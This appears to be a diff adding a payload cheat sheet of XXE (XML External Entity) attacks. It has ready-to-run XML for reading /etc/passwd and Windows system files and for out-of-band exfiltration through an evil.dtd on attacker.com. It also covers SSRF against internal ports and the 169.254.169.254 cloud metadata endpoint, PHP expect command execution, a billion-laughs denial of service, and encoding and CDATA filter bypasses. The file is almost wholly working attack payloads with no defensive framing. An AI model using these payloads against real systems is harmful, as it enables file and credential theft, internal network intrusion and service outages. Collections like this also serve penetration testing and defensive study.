@@ -1,0 +1,199 @@
+# XXE (XML External Entity) Payloads
+
+## ========================================
+## BASIC XXE PAYLOADS
+## ========================================
+
+# Classic XXE - File Read
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+# XXE with Parameter Entity
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
+<foo></foo>
+
+## ========================================
+## BLIND XXE - OOB Data Exfiltration
+## ========================================
+
+# Attacker's DTD (evil.dtd on attacker.com)
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+# Victim XML
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
+<foo></foo>
+
+## ========================================
+## BLIND XXE - Error-Based
+## ========================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %error;
+]>
+<foo></foo>
+
+## ========================================
+## XXE - SSRF Exploitation
+## ========================================
+
+# Internal Port Scanning
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]>
+<foo>&xxe;</foo>
+
+# Cloud Metadata
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<foo>&xxe;</foo>
+
+## ========================================
+## XXE - DOS (Billion Laughs Attack)
+## ========================================
+
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+
+## ========================================
+## XXE - Protocol Exploitation
+## ========================================
+
+# File Protocol
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+# HTTP Protocol
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>
+
+# FTP Protocol
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com">]>
+
+# PHP Expect
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+
+# PHP Filter
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+
+## ========================================
+## XXE - Different XML Formats
+## ========================================
+
+# SOAP XXE
+<soap:Body>
+  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include href="file:///etc/passwd"/>
+  </foo>
+</soap:Body>
+
+# SVG XXE
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  <text>&xxe;</text>
+</svg>
+
+# DocBook XXE
+<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<doc>&xxe;</doc>
+
+## ========================================
+## XXE - Windows File Access
+## ========================================
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
+
+## ========================================
+## XXE - XInclude Attack
+## ========================================
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+
+## ========================================
+## XXE - UTF-7 Encoding
+## ========================================
+
+<?xml version="1.0" encoding="UTF-7"?>
++ADw-+ACE-DOCTYPE foo+AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
++ADw-foo+AD4-+ACY-xxe+ADsAPA-/foo+AD4-
+
+## ========================================
+## XXE - Base64 Encoding
+## ========================================
+
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+<test>&xxe;</test>
+
+## ========================================
+## ADVANCED OOB TECHNIQUES
+## ========================================
+
+# DTD on attacker server
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+%all;
+
+# evil.dtd
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?%file;'>">
+%send;
+
+## ========================================
+## XXE - SOAP Web Services
+## ========================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <foo>&xxe;</foo>
+  </soap:Body>
+</soap:Envelope>
+
+## ========================================
+## XXE - Office Documents
+## ========================================
+
+# docx, xlsx, pptx - Modify [Content_Types].xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
+  <xxe>&xxe;</xxe>
+</Types>
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# Using CDATA
+<![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>]]>
+
+# UTF-16 Encoding
+<?xml version="1.0" encoding="UTF-16"?>
+
+# External DTD with Data URI
+<!DOCTYPE foo SYSTEM "data:text/plain;base64,PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj5dPg==">
